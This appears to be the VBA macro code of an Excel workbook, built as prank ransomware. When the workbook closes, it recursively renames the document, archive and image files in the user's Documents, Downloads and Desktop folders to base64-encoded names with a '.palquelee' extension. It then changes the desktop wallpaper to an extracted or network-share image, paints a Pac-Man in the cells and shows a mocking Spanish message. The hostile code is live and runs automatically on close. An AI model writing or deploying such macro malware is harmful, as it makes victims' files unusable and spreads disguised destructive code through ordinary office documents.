Option Explicit

Private Const SPI_SETDESKWALLPAPER = 20
Private Const SPIF_SENDWININICHANGE = &H2
Private Const SPIF_UPDATEINIFILE = &H1

Private Type typHEADER
    strType As String * 2  ' Signature of file = "BM"
    lngSize As Long        ' File size
    intRes1 As Integer     ' reserved = 0
    intRes2 As Integer     ' reserved = 0
    lngOffset As Long      ' offset to the bitmap data (bits)
End Type

Private Type typINFOHEADER
    lngSize As Long        ' Size
    lngWidth As Long       ' Height
    lngHeight As Long      ' Length
    intPlanes As Integer   ' Number of image planes in file
    intBits As Integer     ' Number of bits per pixel
    lngCompression As Long ' Compression type (set to zero)
    lngImageSize As Long   ' Image size (bytes, set to zero)
    lngxResolution As Long ' Device resolution (set to zero)
    lngyResolution As Long ' Device resolution (set to zero)
    lngColorCount As Long  ' Number of colors (set to zero for 24 bits)
    lngImportantColors As Long ' "Important" colors (set to zero)
End Type

Private Type typPIXEL
    bytB As Byte    ' Blue
    bytG As Byte    ' Green
    bytR As Byte    ' Red
End Type

Private Type typBITMAPFILE
    bmfh As typHEADER
    bmfi As typINFOHEADER
    bmbits() As Byte
End Type

Private Declare PtrSafe Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long

Private Sub Workbook_BeforeClose(Cancel As Boolean)

Randomize

ChangeFiles
Start
Pacman
ThisWorkbook.Saved = True
'ThisWorkbook.Save
MsgBox "Ya valiste wey!"

End Sub

Private Sub Pacman()

Dim Color, Width
Color = Int((30 - 1 + 1) * Rnd + 1)
Width = 5

Range("A:A").ColumnWidth = Width
Range("B:B").ColumnWidth = Width
Range("C:C").ColumnWidth = Width
Range("D:D").ColumnWidth = Width
Range("E:E").ColumnWidth = Width
Range("F:F").ColumnWidth = Width
Range("G:G").ColumnWidth = Width

Range("A4:A8").Interior.ColorIndex = Color
Range("B3:B9").Interior.ColorIndex = Color
Range("C2:C10").Interior.ColorIndex = Color
Range("D2:D10").Interior.ColorIndex = Color
Range("E2:E10").Interior.ColorIndex = Color
Range("F3:F5").Interior.ColorIndex = Color
Range("F7:F9").Interior.ColorIndex = Color
Range("G4").Interior.ColorIndex = Color
Range("G8").Interior.ColorIndex = Color

End Sub

Function btoa(sourceStr)
    Dim i, j, n, carr, rarr(), a, b, c
    carr = Array("A", "B", "C", "D", "E", "F", "G", "H", _
            "I", "J", "K", "L", "M", "N", "O", "P", _
            "Q", "R", "S", "T", "U", "V", "W", "X", _
            "Y", "Z", "a", "b", "c", "d", "e", "f", _
            "g", "h", "i", "j", "k", "l", "m", "n", _
            "o", "p", "q", "r", "s", "t", "u", "v", _
            "w", "x", "y", "z", "0", "1", "2", "3", _
            "4", "5", "6", "7", "8", "9", "+", "/")
    n = Len(sourceStr) - 1
    ReDim rarr(n \ 3)
    For i = 0 To n Step 3
        a = AscW(Mid(sourceStr, i + 1, 1))
        If i < n Then
            b = AscW(Mid(sourceStr, i + 2, 1))
        Else
            b = 0
        End If
        If i < n - 1 Then
            c = AscW(Mid(sourceStr, i + 3, 1))
        Else
            c = 0
        End If
        rarr(i \ 3) = carr(a \ 4) & carr((a And 3) * 16 + b \ 16) & carr((b And 15) * 4 + c \ 64) & carr(c And 63)
    Next
    i = UBound(rarr)
    If n Mod 3 = 0 Then
        rarr(i) = Left(rarr(i), 2) & "=="
    ElseIf n Mod 3 = 1 Then
        rarr(i) = Left(rarr(i), 3) & "="
    End If
    btoa = Join(rarr, "")
End Function


Function char_to_utf8(sChar)
    Dim c, b1, b2, b3
    c = AscW(sChar)
    If c < 0 Then
        c = c + &H10000
    End If
    If c < &H80 Then
        char_to_utf8 = sChar
    ElseIf c < &H800 Then
        b1 = c Mod 64
        b2 = (c - b1) / 64
        char_to_utf8 = ChrW(&HC0 + b2) & ChrW(&H80 + b1)
    ElseIf c < &H10000 Then
        b1 = c Mod 64
        b2 = ((c - b1) / 64) Mod 64
        b3 = (c - b1 - (64 * b2)) / 4096
        char_to_utf8 = ChrW(&HE0 + b3) & ChrW(&H80 + b2) & ChrW(&H80 + b1)
    Else
    End If
End Function

Function str_to_utf8(sSource)
    Dim i, n, rarr()
    n = Len(sSource)
    ReDim rarr(n - 1)
    For i = 0 To n - 1
        rarr(i) = char_to_utf8(Mid(sSource, i + 1, 1))
    Next
    str_to_utf8 = Join(rarr, "")
End Function

Function str_to_base64(sSource)
    str_to_base64 = btoa(str_to_utf8(sSource))
End Function

Private Sub SetWallpaper(ByVal FileName As String)

Dim ret As Long

ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, SPIF_SENDWININICHANGE Or SPIF_UPDATEINIFILE)

End Sub


Function InternalLoop(mainFolder)
    On Error Resume Next
    Dim objFolders, objFolder, objFiles, objFile, RegEx
    
    Set RegEx = CreateObject("VBScript.RegExp")
    RegEx.Pattern = "\.(doc|docx|xls|xlsx|ppt|pptx|csv|msg|eml|pdf|txt|bat|com|zip|rar|7z|jpg|jpeg|png|gif|bmp)$"
    
    Set objFiles = mainFolder.Files
    For Each objFile In objFiles
        If RegEx.Test(objFile.Name) Then
            objFile.Name = Replace(str_to_base64(objFile.Name), "=", "") & ".palquelee"
        End If
    Next
    
    Set objFolders = mainFolder.SubFolders
    For Each objFolder In objFolders
        InternalLoop objFolder
    Next
End Function

Function ChangeFiles()
    Dim objFSO, objFolders, objFolder
    
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFolders = objFSO.GetFolder(Environ("USERPROFILE")).SubFolders
    
    For Each objFolder In objFolders
        If objFolder.Name = "Documents" Or objFolder.Name = "Downloads" Or objFolder.Name = "Desktop" Then
            InternalLoop objFolder
        End If
    Next

    Set objFSO = Nothing
    Set objFolders = Nothing
    Set objFolder = Nothing
End Function

Public Sub Start()

Dim DirFile As String
DirFile = "\\BCSNT01\pasoiso"

On Error Resume Next
If (Dir(DirFile) = "") Then
    extractImgs
    SetWallpaper ("C:\Users\Public\Pictures\asd.jpg")
Else
    SetWallpaper (DirFile & "\ran.jpg")
End If

End Sub


Sub extractImgs()
Dim sh As Worksheet
Dim shp As Shape, Temp As Object, tArea As Object
Dim tempChart As String, wsName As String

For Each sh In Application.Sheets
    wsName = sh.Name
    For Each shp In sh.Shapes
       If shp.Type = msoPicture Then
            shp.Select
            Application.Selection.CopyPicture
            Set Temp = ActiveSheet.ChartObjects.Add(0, 0, shp.Width, shp.Height)
            Set tArea = Temp.Chart
            Temp.Activate
            With tArea
                .ChartArea.Select
                .Paste
                .Export ("C:\Users\Public\Pictures\asd.jpg")
            End With
            Temp.Delete
            DoEvents
        End If
    Next
Next

End Sub